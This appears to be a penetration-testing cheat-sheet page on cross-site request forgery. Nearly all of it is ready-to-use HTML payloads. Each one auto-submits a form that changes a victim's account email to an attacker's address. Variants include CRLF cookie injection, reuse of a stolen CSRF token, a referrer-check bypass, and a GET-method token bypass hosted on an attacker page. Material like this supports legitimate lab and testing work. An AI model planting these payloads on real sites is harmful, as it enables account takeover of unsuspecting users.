---
title: Cross-Site Request Forgery (CSRF)
desc: 
tags: [Burp Suite, Cross, CSRF, Site, Web]
alts: []
render_with_liquid: false
---

## 1. POST Request

The payloads need to be entered in the post form like comments, profile in the target web page.  
They force to update the victim account's email address to your email address.

1. **Basic**

    ```html
    <form method="POST" action="https://vulnerable.com/change-email">
        <input type="hidden" name="email" value="attacker@example.com">
    </form>
    <script>
        document.forms[0].submit();
    </script>
    ```

2. **Cookie Injection**

    ```html
    <form method="POST" action="https://vulnerable.com/change-email">
        <input type="hidden" name="email" value="attacker@example.com">
    </form>
    <img src="https://vulnerable.com/?search=attack%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit();">
    ```

3. **Use the Other CSRF Token**

    ```html
    <form method="POST" action="https://vulnerable.com/change-email">
        <input type="hidden" name="email" value="attacker@example.com">
        <input type="hidden" name="csrf" value="PqORuKZMr9zIJxpZC2cA8BgHuQGVkW8h">
    </form>
    <script>
        document.forms[0].submit();
    </script>
    ```

4. **Referrer Validation**

    ```html
    <meta name="referrer" content="no-referrer">

    <form method="POST" action="https://vulnerable.com/change-email">
        <input type="hidden" name="email" value="attacker@example.com">
    </form>
    <script>
        // For referrer validation....
        history.pushState("", "", "/?vulnerable.com");
        
        document.forms[0].submit();
    </script>
    ```

<br />

## 2. GET Request (Bypass CSRF Token)

```html
<!-- ex. https://attacker.com/exploit -->

<form method="GET" action="https://vulnerable.com/change-email">
    <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>
    document.forms[0].submit();
</script>
```
